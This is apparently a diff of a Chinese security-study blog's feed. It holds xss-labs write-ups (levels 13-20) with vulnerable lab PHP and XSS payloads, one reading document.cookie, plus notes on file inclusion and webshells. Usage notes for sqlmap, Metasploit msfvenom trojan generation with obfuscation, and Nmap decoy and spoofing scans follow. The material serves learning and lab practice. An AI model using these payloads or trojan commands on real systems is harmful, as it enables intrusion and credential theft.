+&lt;h2 align=center&gt;没有找到和good job!相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_cook&quot;  value=&quot;call me maybe?&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:9&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ul>
+<li>有个cook参数，猜测使用Cookies可以提交，使用上上关payload，发现cook内容里的参数消失了。</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+setcookie(&quot;user&quot;, &quot;call me maybe?&quot;, time()+3600);
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_COOKIE[&quot;user&quot;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_cook&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>这里COOKIE提交的是user参数，更改payload增加user参数尝试。</li>
+</ul>
+<ol start="3">
+<li></li>
+</ol>
+<pre><code>Cookies：user=&quot; type=&quot;text&quot; onclick=&quot;alert()
+</code></pre>
+<h1 id="14-xss-level14">14. xss-level14</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;
+&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/xsschallenge/level15.php?src=1.gif&gt;点我进level15&lt;/a&gt;&lt;/center&gt;
+&lt;/body&gt;
+</code></pre>
+<ul>
+<li>会自动跳转到http://www.exifviewer.org/?z的页面，并且没有php的代码，一头雾水</li>
+</ul>
+<ol start="2">
+<li>通过上网查询，得到解释，这里本来是一个exif xss的漏洞，要将xss代码写进exif里面，但是现在没有办法进行测试。</li>
+<li>大致的意思为需要上传一个带有xss信息的图片来触发xss。</li>
+<li>通过设置图片的主题或者标题为xss代码，上传图片。</li>
+<li>模拟xss-level14的php代码。</li>
+</ol>
+<pre><code>&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;title&gt;欢迎来到level14&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level14&lt;/h1&gt;
+&lt;!--&lt;center&gt;&lt;iframe name=&quot;leftframe&quot; marginwidth=10 marginheight=10 src=&quot;http://www.exifviewer.org/&quot; frameborder=no width=&quot;80%&quot; scrolling=&quot;no&quot; height=80%&gt;&lt;/iframe&gt;&lt;/center&gt;--&gt;
+    &lt;?php
+   echo &quot;&lt;center&gt;
+   &lt;form action=level14.php method=POST enctype=multipart/form-data&gt;
+   &lt;label for=file&gt;文件名：&lt;/label&gt;
+   &lt;input type=file name=file id=file&gt;&lt;br&gt;
+   &lt;input type=submit name=submit value=提交&gt;
+&lt;/form&gt;&lt;/center&gt;&quot;;
+
+// 允许上传的图片后缀
+$allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);
+$temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);
+echo $_FILES[&quot;file&quot;][&quot;size&quot;];
+$extension = end($temp);     // 获取文件后缀名
+if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;)
+|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)
+|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;)
+|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)
+|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;)
+|| ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;))
+&amp;&amp; ($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 204800)   // 小于 200 kb
+&amp;&amp; in_array($extension, $allowedExts))
+{
+    if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)
+    {
+        echo &quot;错误：: &quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;
+    }
+    else
+    {
+        echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;
+        echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;
+        echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024) . &quot; kB&lt;br&gt;&quot;;
+        echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;] . &quot;&lt;br&gt;&quot;;
+    
+        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $_FILES[&quot;file&quot;][&quot;name&quot;]);
+    }
+}
+else
+{
+    echo &quot;非法的文件格式&quot;;
+}
+    $file = $_FILES[&quot;file&quot;][&quot;name&quot;];
+    echo $file;
+
+    $exif = exif_read_data($file);
+    var_dump($exif)
+?&gt;
+&lt;?php
+
+?&gt;
+&lt;center&gt;这关成功后不会自动跳转。成功者&lt;a href=/level15.php?src=level15.png&gt;点我进level15&lt;/a&gt;&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<h1 id="15-xss-level15">15. xss-level15</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;html ng-app&gt;
+&lt;head&gt;
+        &lt;meta charset=&quot;utf-8&quot;&gt;
+        &lt;script src=&quot;https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js&quot;&gt;&lt;/script&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level16.php?keyword=test&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level15&lt;/title&gt;
+&lt;/head&gt;
+&lt;h1 align=center&gt;欢迎来到第15关，自己想个办法走出去吧！&lt;/h1&gt;
+&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;
+&lt;body&gt;&lt;span class=&quot;ng-include:&quot;&gt;&lt;/span&gt;&lt;/body&gt;
+</code></pre>
+<ul>
+<li>因为原先的https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js被墙了，所以换成https://cdn.staticfile.org/angular.js/1.4.6/angular.min.js</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;src&quot;];
+echo '&lt;body&gt;&lt;span class=&quot;ng-include:'.htmlspecialchars($str).'&quot;&gt;&lt;/span&gt;&lt;/body&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>ng-include 指令使用了AngularJS，可以通过新的属性，新的表达式扩展HTML。</li>
+<li>可以用于包含外部的 HTML 文件。</li>
+<li>包含的内容将作为指定元素的子节点。</li>
+<li>ng-include 属性的值可以是一个表达式，返回一个文件名。</li>
+<li>默认情况下，包含的文件需要包含在同一个域名下。</li>
+<li>值得注意
+<ul>
+<li>如果要指定单纯的地址，必须要加上引号。</li>
+<li>当加载外部html文件时，scritp标签中的内容不会被执行，含有style标签样式可以被执行。</li>
+</ul>
+</li>
+</ul>
+<ol start="3">
+<li>payload</li>
+</ol>
+<pre><code>level15.php?src='level1.php?name=&lt;img src=1 onerror=alert(1)&gt;'
+</code></pre>
+<ul>
+<li>这里已经知道了可以通过使用ng-include来包含HTML的内容</li>
+<li>在.php后面增加了参数值。类似于访问了该文件参数值之后，将该值包含在html文件后响应。</li>
+</ul>
+<h1 id="16-xss-level16">16. xss-level16</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;
+&lt;center&gt;&lt;&amp;nbsp;&gt;alert()&lt;&amp;nbsp;&amp;nbsp;&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:29&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);
+$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);
+$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);
+$str5=str_replace(&quot;	&quot;,&quot;&amp;nbsp;&quot;,$str4);
+echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;
+?&gt;
+</code></pre>
+<ul>
+<li>script，空格，斜杠都被处理了，这里也没有一个值需要进行包裹。</li>
+<li>用之前15关的方法，但是空格被实体化了，所以这里有绕过技巧涉及到url编码。</li>
+<li>而我们又知道仅仅只在html代码中进行换行对实际的代码是没有效果的，所以这里可以用回车的url编码%0a来代替空格。</li>
+</ul>
+<ol start="3">
+<li>payload</li>
+</ol>
+<pre><code>level16.php?keyword=&lt;img%0asrc=1%0aonerror=alert(1)&gt;
+</code></pre>
+<h1 id="17-xss-level17">17. xss-level17</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;
+&lt;embed src=xsf01.swf?a=b width=100% heigth=100%&gt;&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;
+&lt;/body&gt;
+</code></pre>
+<ul>
+<li>特别说明：这之后的关卡需要用到flash插件</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+echo &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;
+?&gt;
+</code></pre>
+<ul>
+<li>arg01 arg02被过滤掉了，这里没有引号，不需要对src进行包裹，直接在后面加上payload，移动鼠标进行弹窗。</li>
+</ul>
+<ol start="3">
+<li>payload</li>
+</ol>
+<pre><code>onmouseover=alert()
+</code></pre>
+<h1 id="18-xss-level18">18. xss-level18</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level18&lt;/h1&gt;
+&lt;embed src=xsf02.swf?a=b width=100% heigth=100%&gt;&lt;/body&gt;
+</code></pre>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+echo &quot;&lt;embed src=xsf02.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;
+?&gt;
+</code></pre>
+<ul>
+<li>查看17，18两关的代码基本上没有什么差别，用第17关的payload也可以通过</li>
+</ul>
+<h1 id="19-xss-level19">19. xss-level19</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level19&lt;/h1&gt;
+&lt;embed src=&quot;xsf03.swf?a=b&quot; width=100% heigth=100%&gt;&lt;/body&gt;
+</code></pre>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php
+ini_set(&quot;display_errors&quot;, 0);
+echo '&lt;embed src=&quot;xsf03.swf?'.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).'&quot; width=100% heigth=100%&gt;';
+?&gt;
+</code></pre>
+<ol start="3">
+<li>payload</li>
+</ol>
+<pre><code>level19.php?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert()&quot;&gt;xss&lt;/a&gt;
+</code></pre>
+<ol start="4">
+<li><a href="https://blog.csdn.net/u014029795/article/details/103213877?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522159547621119725219908275%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=159547621119725219908275&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v3~pc_rank_v4-2-103213877.first_rank_ecpm_v3_pc_rank_v4&amp;utm_term=xss-labs%2019&amp;spm=1018.2118.3001.4187">xss19</a></li>
+</ol>
+<h1 id="20-xss-level20">20. xss-level20</h1>
+<pre><code>level20.php?arg01=id&amp;arg02=\&quot;))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//%26width%26height
+</code></pre>
+<p><a href="https://blog.csdn.net/u014029795/article/details/103217680">xss20</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[php 伪协议与钓鱼]]></title>
+        <id>https://kite-007.github.io/php-wei-xie-yi-yu-diao-yu/</id>
+        <link href="https://kite-007.github.io/php-wei-xie-yi-yu-diao-yu/">
+        </link>
+        <updated>2021-03-21T00:55:20.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="1">1.</h1>
+<p>文件包含文件写入<br>
+flag在服务器根目录<br>
+目录穿越（../）或伪协议（php://filter/read=convert.base64）或file协议（file:///）<br>
+字符串过滤器<br>
+转换过滤器<br>
+压缩过滤器<br>
+编码绕过<br>
+docx可以直接改为zip，两者可以相互打开，docx-小马，1.txt-zip-docx，<br>
+phar协议-php-压缩包-木马-协议包含<br>
+加密过滤器<br>
+文件包含，直接运行php代码<br>
+分离免杀，危险数据，exe运行文件<br>
+exit绕过：exit部分进行编码处理，使php不能被识别，之后使内容写入文件，链接<br>
+.htaccess配置文件，将文件直接当作php执行<br>
+bypass绕过<br>
+usc-2，构成2的倍数，对目标字符串2位一反转<br>
+file_put_contents会解码一次，浏览器会解码一次，二次解码<br>
+tamp，Windows临时文件，爆破临时将文件，<br>
+伪造uav为一句话木马，文件包含日志文件，访问一句话木马，服务器访问临时文件，条件竞争<br>
+python脚本-服务器-不知道路径-加载phpinfo-加载路径-包含getshell<br>
+windows大小写不敏感，Linux大小写敏感</p>
+<h1 id="2">2.</h1>
+<p>打入内网，扩大成果<br>
+cobait strike<br>
+swaks</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[# 工具]]></title>
+        <id>https://kite-007.github.io/gong-ju/</id>
+        <link href="https://kite-007.github.io/gong-ju/">
+        </link>
+        <updated>2021-03-16T23:57:18.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="1-sqlmap">1. sqlmap</h1>
+<ol>
+<li>介绍：它是一个开源渗透测试工具，它可以自动检测和利用SQL注入漏洞并接管数据库服务器的工具。</li>
+<li>技巧：可以搜索php?id=,php?name=等等一些查看有没有表单提交。</li>
+<li>操作：</li>
+</ol>
+<ul>
+<li>sqlmap -u (需要测试的网站)；sqlmap会直接帮我们测试存不存在该类型漏洞，也会显示出payload</li>
+<li>-h，-hh获取帮助文档或者更多帮助列表
+<ul>
+<li>Target；使用sqlmap的模式
+<ul>
+<li>-d [连接数据库信息]；测试连接数据库，需要下载驱动程序</li>
+<li>-u</li>
+<li>-m；文件中有多个参数时可以一个个遍历，查询其中一个则需要在这一个参数后面加上*</li>
+<li>-r；测试http包（burp所抓到的包存入一个文件中，对文件进行测试）</li>
+<li>-g [inurl:php?id=1]；google搜索（inurl:php?id=1）</li>
+<li>-c；加载配置文件</li>
+</ul>
+</li>
+<li>request；如何请求页面，链接页面的方式，请求页面的方式post，get等
+<ul>
+<li>--method；http请求方法</li>
+<li>--data；填充post包</li>
+<li>--cookie=COOKIE；设置COOKIE</li>
+<li>--user-agent=AGENT；将sqlmap设置来源代理为AGENT</li>
+<li>--random-agent；随机选取一个代理</li>
+<li>--host=HOST；修改HOST</li>
+<li>--referer=REFERER；修改REFERER网站来源</li>
+<li>--header=HEADER；修改以上的http头</li>
+</ul>
+</li>
+<li>optimization；实现优化作用，性能速度
+<ul>
+<li>-o；使用所有优化</li>
+</ul>
+</li>
+<li>injection；注入参数，提供自定义的方式，脚本等</li>
+<li>detection；探测注入等级</li>
+<li>techniques；调整测试技术方式
+<ul>
+<li>--technique=TECH；默认使用所有注入方式</li>
+</ul>
+</li>
+<li>enumeration；枚举参数（前提为存在sql注入）列出参数
+<ul>
+<li>--users</li>
+<li>--tables</li>
+</ul>
+</li>
+<li>windows registry access；查看win注册表</li>
+<li>general；通用</li>
+<li>miscellaneous；杂项
+<ul>
+<li>--wizard；sqlmap使用导航引导测试</li>
+<li>--sqlmap-shell；sqlmap命令选项模式</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h1 id="2-metosploit">2. metosploit</h1>
+<ol>
+<li>介绍：Metasploit渗透测试框架（Free ，Pro），再Kali中使用msfconsole打开</li>
+<li>功能：探测发现，漏洞验证，漏洞攻击，漏洞载核，编码混淆等等</li>
+<li>命令：
+<ul>
+<li>show exploits；展示可使用的漏洞的攻击方式，如果要使用一个漏洞，则须先扫描漏洞</li>
+<li>search [cve-XX]；搜索漏洞</li>
+<li>use [漏洞存放目录]；使用漏洞</li>
+<li>show info；查看漏洞设置选项</li>
+<li>show payloads；use漏洞之后要使用的</li>
+</ul>
+<pre><code>use [漏洞] //使用漏洞攻击
+set PAYLOAD &lt;Payload name&gt;//攻击成功之后会执行payload 
+set LHOST &lt;LHOST value&gt;//对方链接攻击者IP 端口是什么
+set LPORT &lt;LPORT value&gt;//
+Show info
+exploits/run
+</code></pre>
+<ul>
+<li>meterpreter（模块）；肉机管理，回话管理（控制端）
+<ul>
+<li>shell，获取对方shell</li>
+<li>Download/Upload</li>
+<li>search/edit</li>
+<li>portfwd端口转发</li>
+<li>migrate迁移进程</li>
+<li>execute</li>
+</ul>
+</li>
+<li>msfvenom；生成payload，生成木马后门的工具</li>
+</ul>
+<pre><code>msfvenom -p [payload] LHOST=X  LPORT=X -f [exe] &gt; []
+msfvenom//生成木马的工具
+-p //指定payload类型
+LHOST//是控制端IP
+LPORT//控制端端口
+-f //指文件格式
+</code></pre>
+<ul>
+<li>混淆payload</li>
+</ul>
+<pre><code>msfvenom -p [payload] LHOST=X  LPORT=X -e [混淆] -f [exe] &gt; []
+</code></pre>
+<ul>
+<li>check；扫描对方是否可以攻击，是否存在该漏洞</li>
+<li>msfvenmo -l encoders ；编码混淆，木马混淆</li>
+</ul>
+</li>
+<li>免杀*</li>
+</ol>
+<ul>
+<li>混淆的主要目的（二进制）；修改md5（pe，资源表，字符串）</li>
+</ul>
+<h1 id="3-nmap">3. Nmap</h1>
+<ol>
+<li>使用流程：(目标确认—》主机发现—》扫描端口—》扫描技术—》探测服务—》探测防火墙—》性能优化—》报告输出)</li>
+<li>用途： 活跃IP，端口的扫描，对端口，服务，操作系统的探测，将扫描的内容保存在一个文件，扫描常用的端口，多种扫描方式，脚本扫描，性能控制，主机发现，规避防火墙，MAC欺骗，空闲扫描。</li>
+<li>端口扫描：</li>
+</ol>
+<ul>
+<li>nmap 【网站/IP地址】-p 【端口】 -sS(扫描方式:基于TCP SYN) -sV(探测服务信息) -O(探测操作系统) -A(包含了-sV和-O等)
+<ul>
+<li>可以按回车显示进度，如果不对单一的端口进行扫描直接使用-sS -A即可。-iR，对随机IP扫描。</li>
+<li>活跃IP：是指 一个 ip段 ，存在的 主机 较多， 查找 活跃 ip的 人一般会，运行远程溢出，弱口令扫描软件。</li>
+<li>-p --top-ports X：扫描常用的端口X个。</li>
+<li>-oN 【目录】，输出扫描内容到该目录的文件夹</li>
+<li>--script=【./脚本目录】可以使用脚本</li>
+<li>-n；不做DNS解析，如果解析了会知道域名</li>
+<li>-F；扫描默认常用端口100多</li>
+<li>-sL；简单列出扫描目标信息</li>
+<li>-Pn；nmap扫描过程中会探测主机是否在线，如果主机在线，则会去扫描端口，通常情况下已经知道了主机在线，所以加上-Pn 【IP】，则不用再去探测主机是否在线，默认主机为在线状态。</li>
+<li>-O：检测操作系统</li>
+<li>-D 【IP】，【IP】：设置诱饵隐蔽扫描</li>
+<li>-g 【端口】 【IP】：设置自己来源端口与IP（假）</li>
+<li>-T&lt;0-5&gt;：速度性能控制</li>
+<li>--spoof -mac 【MAC地址】：伪造自己的访问目标MAC地址为对应MAC地址</li>
+<li>-sI ip:【脚本扫描到的端口】 【脚本扫描到的IP】；网络上有多台主机，当有某台空闲的时候，就可以利用对方的IP做出一些扫描。</li>
+<li>sudo nmap --script ipidseq iR 10000 -oN ipidseq.txt
+<ul>
+<li>用脚本扫描扫出可以使用空闲扫描的对应IP端口</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[# KALI]]></title>
+        <id>https://kite-007.github.io/kali/</id>
+        <link href="https://kite-007.github.io/kali/">
+        </link>
+        <updated>2021-03-15T07:57:48.000Z</updated>
+        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
+<li><a href="#1-%E5%9F%BA%E6%9C%AC">1. 基本</a>
+<ul>
+<li><a href="#1-%E6%9B%B4%E6%94%B9root%E5%AF%86%E7%A0%81%E4%BD%BFkali%E8%83%BD%E5%A4%9F%E5%BC%80%E6%9C%BA%E7%99%BB%E9%99%86">1. 更改root密码，使kali能够开机登陆</a></li>
+<li><a href="#2-%E6%8D%A2%E6%BA%90%E5%B9%B6%E6%9B%B4%E6%96%B0">2. 换源并更新</a></li>
+<li><a href="#3-%E5%AE%89%E8%A3%85%E8%BE%93%E5%85%A5%E6%B3%95">3. 安装输入法</a></li>
+</ul>
+</li>
+<li><a href="#2-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">2. 信息收集</a>
+<ul>
+<li><a href="#1-nmap%E6%89%AB%E6%8F%8Fip">1. Nmap扫描（IP）</a></li>
+<li><a href="#2-%E5%AD%90%E5%9F%9F%E5%90%8D">2. 子域名</a></li>
+</ul>
+</li>
+</ul>
+(KALI)</p>
+<h1 id="1-基本">1. 基本</h1>
+<h2 id="1-更改root密码使kali能够开机登陆">1. 更改root密码，使kali能够开机登陆</h2>
+<ul>
+<li>（sudo passwd root）。</li>
+<li>sudo命令以系统管理者的身份执行，相当于root。</li>
+<li><img src="https://kite-007.github.io/post-images/1615795367734.png" alt="" loading="lazy"></li>
+<li>uname可以查看版本</li>
+</ul>
+<h2 id="2-换源并更新">2. 换源并更新</h2>
+<ul>
+<li>kali的源文件在/etc/apt/sources.list文件中。</li>
+</ul>
+<pre><code>sudo vim /etc/apt/sources.list（打开sources.list 文件）
+
+官方源
+deb http://http.kali.org/kali kali-rolling main non-free contrib
+deb-src http://http.kali.org/kali kali-rolling main non-free contrib
+中科大源
+deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
+deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
+阿里云源
+deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+清华大学源
+deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
+deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
+浙大源
+deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
+deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free
+
+sudo apt-get update  # 取回更新的软件包列表信息
+sudo apt-get upgrade # 进行一次升级
+sudo apt-get clean # 删除已经下载的安装包
+sudo reboot  #重启
+
+安装vm-tools（因为实验很久并没有成功使用“文件夹共享功能”所以选择了这个方法）
+可以快速方便的将文件直接拖进kali中使用
+
+打开“终端”
+输入sudo apt update (获取更新目录）
+输入sudo apt -y full-upgrade (更新软件，-y参数表示自动）
+输入sudo apt -y install open-vm-tools-desktop fuse （安装虚拟机增强工具）
+输入sudo reboot (重启）
+</code></pre>
+<h2 id="3-安装输入法">3. 安装输入法</h2>
+<ol>
+<li>安装输入法框架（apt install fcitx）</li>
+<li>安装谷歌拼音（apt install fcitx-googlepinyin）</li>
+</ol>
+<h1 id="2-信息收集">2. 信息收集</h1>
+<h2 id="1-nmap扫描ip">1. Nmap扫描（IP）</h2>
+<ol>
+<li>使用流程：(目标确认—》主机发现—》扫描端口—》扫描技术—》探测服务—》探测防火墙—》性能优化—》报告输出)</li>
+<li>用途： 活跃IP，端口的扫描，对端口，服务，操作系统的探测，将扫描的内容保存在一个文件，扫描常用的端口，多种扫描方式，脚本扫描，性能控制，主机发现，规避防火墙，MAC欺骗，空闲扫描。</li>
+<li>端口扫描：</li>
+</ol>
+<ul>
+<li>nmap 【网站/IP地址】-p 【端口】 -sS(扫描方式:基于TCP SYN) -sV(探测服务信息) -O(探测操作系统) -A(包含了-sV和-O等)
+<ul>
+<li>可以按回车显示进度，如果不对单一的端口进行扫描直接使用-sS -A即可。-iR，对随机IP扫描。</li>
+<li>活跃IP：是指 一个 ip段 ，存在的 主机 较多， 查找 活跃 ip的 人一般会，运行远程溢出，弱口令扫描软件。</li>
+<li>-p --top-ports X：扫描常用的端口X个。</li>
+<li>-oN 【目录】，输出扫描内容到该目录的文件夹</li>
+<li>--script=【./脚本目录】可以使用脚本</li>
+<li>-n；不做DNS解析，如果解析了会知道域名</li>
+<li>-F；扫描默认常用端口100多</li>
+<li>-sL；简单列出扫描目标信息</li>
+<li>-Pn；nmap扫描过程中会探测主机是否在线，如果主机在线，则会去扫描端口，通常情况下已经知道了主机在线，所以加上-Pn 【IP】，则不用再去探测主机是否在线，默认主机为在线状态。</li>
+<li>-O：检测操作系统</li>
+<li>-D 【IP】，【IP】：设置诱饵隐蔽扫描</li>
+<li>-g 【端口】 【IP】：设置自己来源端口与IP（假）</li>
+<li>-T&lt;0-5&gt;：速度性能控制</li>
+<li>--spoof -mac 【MAC地址】：伪造自己的访问目标MAC地址为对应MAC地址</li>
+<li>-sI ip:【脚本扫描到的端口】 【脚本扫描到的IP】；网络上有多台主机，当有某台空闲的时候，就可以利用对方的IP做出一些扫描。</li>
+<li>sudo nmap --script ipidseq iR 10000 -oN ipidseq.txt
+<ul>
+<li>用脚本扫描扫出可以使用空闲扫描的对应IP端口</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="2-子域名">2. 子域名</h2>
+<p><em>补充：子域名也要做DNS解析，它也有对应的IP。</em></p>
+<ul>
+<li>子域名有很多的获取方式。</li>
+</ul>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[1. 信息收集之基本介绍]]></title>
         <id>https://kite-007.github.io/1-xin-xi-shou-ji/</id>
@@ -377,17 +1536,22 @@ shodan honeyscore [目标IP]</li>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[1. 拒绝服务攻击]]></title>
+        <title type="html"><![CDATA[1. 网络攻击]]></title>
         <id>https://kite-007.github.io/1-wang-luo-gong-ji/</id>
         <link href="https://kite-007.github.io/1-wang-luo-gong-ji/">
         </link>
         <updated>2021-03-13T11:49:29.000Z</updated>
         <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
-<li><a href="#1-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB">1. 拒绝服务攻击</a></li>
+<li><a href="#1-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB">1. 拒绝服务攻击</a>
+<ul>
+<li><a href="#dos%E6%94%BB%E5%87%BB">Dos攻击</a></li>
+</ul>
+</li>
 </ul>
 (网络攻击)</p>
 <h1 id="1-拒绝服务攻击">1. 拒绝服务攻击</h1>
-<p><strong>定义：攻击者。</strong></p>
+<p><strong>定义：攻击者会想办法让目标停止服务。通常是对目标网络资源上的消耗，使目标的服务器被暂停或者宕机等一系列能够给目标造成麻烦的后果的攻击方式。拒绝服务攻击一直得不到解决，其根本原因是由于网络协议本身的缺陷造成的。攻击者进行拒绝服务攻击，通常有两种效果：一个是迫使服务器的缓冲区溢满，不再接受新的请求，二是使用IP欺骗，迫使服务器把合法的用户的连接复位，影响正常用户的链接</strong></p>
+<h2 id="dos攻击">Dos攻击</h2>
 ]]></content>
